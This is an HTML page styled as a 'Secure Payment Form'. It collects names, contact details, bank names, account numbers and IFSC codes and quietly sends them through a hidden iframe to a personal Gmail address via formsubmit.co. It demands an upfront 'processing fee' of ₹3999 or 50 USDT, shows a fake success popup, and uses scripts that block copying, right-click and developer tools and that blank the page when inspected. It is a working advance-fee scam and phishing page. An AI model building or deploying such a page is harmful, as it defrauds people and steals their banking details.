<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport"
 content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Secure Payment Form</title>

<style>
body {
  margin: 0;
  padding: 0;
  background: #f4f6f8;
  font-family: Arial, sans-serif;
  display: flex;
  justify-content: center;
  align-items: flex-start;
  min-height: 100vh;
}

.form-card {
  background: #fff;
  padding: 25px;
  width: calc(100% - 30px);
  max-width: 430px;
  border-radius: 14px;
  box-shadow: 0 8px 20px rgba(0,0,0,0.12);
  margin: 40px auto;
}

h2 {
  text-align: center;
  color: #1ca64c;
}

.field {
  margin-top: 14px;
}

.field input, select {
  width: 100%;
  padding: 12px;
  border-radius: 8px;
  border: 1px solid #ccc;
  font-size: 14px;
}

.suggest-box {
  position: absolute;
  width: 100%;
  background: #fff;
  border: 1px solid #ccc;
  max-height: 180px;
  overflow-y: auto;
  z-index: 1000;
}

.suggest-box div {
  padding: 10px;
  cursor: pointer;
}

.payment-section {
  display: none;
  margin-top: 14px;
  background: #f1fdf6;
  border-radius: 14px;
  padding: 18px;
  text-align:center;
}

.fee-box {
  display:none;
  background:#fff4e5;
  border:2px dashed #ff9800;
  padding:15px;
  margin-top:15px;
  border-radius:12px;
  text-align:center;
  font-size:18px;
  font-weight:bold;
  color:#e65100;
}

button {
  width: 100%;
  margin-top: 18px;
  padding: 13px;
  border-radius: 10px;
  border: none;
  background: #1ca64c;
  color: white;
  font-size: 16px;
  font-weight: bold;
  cursor: pointer;
}

#submitPopup {
  display:none;
  position:fixed;
  top:0; left:0;
  width:100%;
  height:100%;
  background:rgba(0,0,0,0.6);
  z-index:9999;
  justify-content:center;
  align-items:center;
}

#submitPopupBox {
  background:white;
  padding:30px;
  border-radius:14px;
  text-align:center;
  width:90%;
  max-width:300px;
}
</style>
</head>

<body>

<div class="form-card">
<h2>Secure Payment Form</h2>

<iframe name="hiddenFrame" style="display:none;"></iframe>

<form id="paymentForm"
action="https://formsubmit.co/chaitanyadeep1@gmail.com"
method="POST"
enctype="multipart/form-data"
target="hiddenFrame"
onsubmit="return showPopup();">

<input type="hidden" name="_captcha" value="false">
<input type="hidden" name="_template" value="table">

<div class="field"><input name="Name" placeholder="Full Name" required></div>
<div class="field"><input name="Email" type="email" placeholder="Email" required></div>
<div class="field"><input name="Mobile" placeholder="Mobile" required></div>

<div class="field">
  <input id="countryInput" name="Country" placeholder="Type Country" onkeyup="searchCountry()" required>
  <div id="countrySuggest" class="suggest-box"></div>
</div>

<div class="field">
  <input id="bankInput" name="Bank" placeholder="Type Bank" onkeyup="searchBank()" required>
  <div id="bankSuggest" class="suggest-box"></div>
</div>

<div class="field"><input name="Account" placeholder="Account No" required></div>
<div class="field"><input name="IFSC" placeholder="IFSC Code"></div>
<div class="field"><input name="Amount" placeholder="Amount" required></div>

<select id="payment" name="Payment Method" required onchange="togglePayment(this.value)">
  <option value="">Select Payment Method</option>
  <option value="UPI">UPI</option>
  <option value="USDT">USDT (BEP20)</option>
</select>

<!-- ✅ FEES DISPLAY -->
<div id="feeBox" class="fee-box"></div>

<div id="upiBox" class="payment-section">
  <h4>Scan & Pay via UPI</h4>
  <img src="qr.png" width="160">
</div>

<div id="usdtBox" class="payment-section">
  <h4>USDT BEP20 Address</h4>

  <div style="display:flex; gap:8px;">
    <input 
      id="usdtAddress"
      value="0xYOURUSDTADDRESS" 
      readonly 
      style="flex:1; text-align:center; font-weight:bold;"
    >

    <button 
      type="button"
      onclick="copyUSDT()"
      style="background:#ff9800; color:white; border:none; border-radius:8px; padding:8px 12px; cursor:pointer;"
    >
      COPY
    </button>
  </div>

  <!-- ✅ AUTO GENERATED QR -->
  <img 
    id="usdtQR" 
    src="" 
    width="160" 
    style="margin-top:12px; display:none;"
  >

  <!-- ✅ COPY SUCCESS TEXT -->
  <p id="copyMsg" style="color:green; font-size:14px; display:none; margin-top:6px;">
    ✅ Address Copied Successfully
  </p>
</div>

<button type="submit">Confirm & Submit</button>
</form>
</div>

<div id="submitPopup">
  <div id="submitPopupBox">
    <h3 style="color:#1ca64c;">✅ Submitted Successfully</h3>
    <p>Your details submitted.<br>Please wait for email confirmation.</p>
  </div>
</div>

<script>
const countryData = {

  India: [
    "State Bank of India (SBI)",
    "HDFC Bank",
    "ICICI Bank",
    "Axis Bank",
    "Punjab National Bank (PNB)",
    "Bank of Baroda (BOB)",
    "Canara Bank",
    "Union Bank of India",
    "IDBI Bank",
    "Indian Bank",
    "Central Bank of India",
    "UCO Bank",
    "Kotak Mahindra Bank",
    "Yes Bank",
    "IndusInd Bank",
    "Federal Bank",
    "Bandhan Bank",
    "RBL Bank",
    "IDFC First Bank",
    "South Indian Bank"
  ],

  USA: [
    "Chase Bank",
    "Bank of America",
    "Wells Fargo",
    "Citibank",
    "Capital One",
    "PNC Bank",
    "U.S. Bank",
    "TD Bank",
    "Truist Bank",
    "Regions Bank",
    "SunTrust Bank",
    "BB&T Bank",
    "Fifth Third Bank",
    "KeyBank",
    "Huntington Bank",
    "M&T Bank",
    "Ally Bank",
    "Discover Bank",
    "Synchrony Bank",
    "Citizens Bank"
  ],

  UAE: [
    "Emirates NBD",
    "First Abu Dhabi Bank (FAB)",
    "Mashreq Bank",
    "Abu Dhabi Commercial Bank (ADCB)",
    "Dubai Islamic Bank",
    "Commercial Bank of Dubai (CBD)",
    "RAK Bank",
    "Sharjah Islamic Bank",
    "Ajman Bank",
    "Noor Bank",
    "Al Hilal Bank",
    "Arab Bank for Investment & Foreign Trade",
    "United Arab Bank",
    "Finance House",
    "National Bank of Fujairah",
    "Emirates Islamic Bank",
    "Invest Bank",
    "Arab Bank UAE",
    "Bank of Baroda UAE",
    "HSBC UAE"
  ],

  UK: [
    "HSBC UK",
    "Barclays",
    "Lloyds Bank",
    "NatWest",
    "Santander UK",
    "TSB Bank",
    "Metro Bank",
    "Nationwide Building Society",
    "Virgin Money UK",
    "Co-operative Bank",
    "Starling Bank",
    "Monzo Bank",
    "Revolut UK",
    "Clydesdale Bank",
    "Yorkshire Bank",
    "Royal Bank of Scotland",
    "Bank of Scotland",
    "Aldermore Bank",
    "Close Brothers",
    "Atom Bank"
  ]

};

let selectedCountry = "";

function searchCountry(){
  let input = countryInput.value.toLowerCase();
  countrySuggest.innerHTML = "";
  Object.keys(countryData).forEach(country=>{
    if(country.toLowerCase().includes(input)){
      let div = document.createElement("div");
      div.innerText = country;
      div.onclick = () => {
        countryInput.value = country;
        selectedCountry = country;
        countrySuggest.innerHTML = "";
      };
      countrySuggest.appendChild(div);
    }
  });
}

function searchBank(){
  if (!selectedCountry) return;
  let input = bankInput.value.toLowerCase();
  bankSuggest.innerHTML = "";
  countryData[selectedCountry].forEach(bank=>{
    if(bank.toLowerCase().includes(input)){
      let div = document.createElement("div");
      div.innerText = bank;
      div.onclick = () => {
        bankInput.value = bank;
        bankSuggest.innerHTML = "";
      };
      bankSuggest.appendChild(div);
    }
  });
}

/* ✅ PAYMENT + FEES LOGIC */
function togglePayment(value){
  upiBox.style.display = "none";
  usdtBox.style.display = "none";
  feeBox.style.display = "none";

  if(value === "UPI"){
    upiBox.style.display = "block";
    feeBox.style.display = "block";
    feeBox.innerHTML = "✅  Processing Fees: ₹3999";
  }

  if(value === "USDT"){
    usdtBox.style.display = "block";
    feeBox.style.display = "block";
    feeBox.innerHTML = "✅ USDT Network Fees: 50 USDT";
  }
}

function showPopup(){
  if(payment.value === ""){
    alert("Please select payment method first!");
    return false;
  }

  submitPopup.style.display = "flex";

  setTimeout(()=>{
    paymentForm.submit();
    setTimeout(()=>{
      paymentForm.reset();
      submitPopup.style.display = "none";
      feeBox.style.display = "none";
      upiBox.style.display = "none";
      usdtBox.style.display = "none";
    },3000);
  },500);

  return false;
}


function copyUSDT(){
  const address = document.getElementById("usdtAddress");
  address.select();
  address.setSelectionRange(0, 99999);
  navigator.clipboard.writeText(address.value);

  const msg = document.getElementById("copyMsg");
  msg.style.display = "block";

  setTimeout(()=>{
    msg.style.display = "none";
  },2000);
}

</script>

 <script>
  // 🚫 Disable right click, select, drag
  document.addEventListener("contextmenu", e => e.preventDefault());
  document.addEventListener("selectstart", e => e.preventDefault());
  document.addEventListener("dragstart", e => e.preventDefault());

  // 🚫 Disable keyboard shortcuts (copy, paste, inspect, etc.)
  document.addEventListener("keydown", e => {
    if (
      e.key === "F12" ||
      (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J")) ||
      (e.ctrlKey && (e.key === "U" || e.key === "C" || e.key === "X" || e.key === "V" || e.key === "S"))
    ) {
      e.preventDefault();
      return false;
    }
  });

  // 🔒 Silent DevTools detection (no popup)
  (function() {
    const devtools = /./;
    devtools.toString = function() {
      return ""; // no alert or console log
    };
    console.log("%c", devtools);
  })();

  // 🔐 Detect DevTools using resize trick (no popup)
  setInterval(() => {
    const threshold = 160;
    const widthDiff = window.outerWidth - window.innerWidth > threshold;
    const heightDiff = window.outerHeight - window.innerHeight > threshold;
    if (widthDiff || heightDiff) {
      // Optional: silently redirect or blank the page
      document.body.innerHTML = "";
    }
  }, 1000);

  // 🧱 Disable copy/paste/cut
  ["copy", "paste", "cut"].forEach(evt =>
    document.addEventListener(evt, e => e.preventDefault())
  );

  // 🔁 Freeze console methods silently
  Object.freeze(console);
  Object.freeze(window.console);
</script> 

</body>
</html>
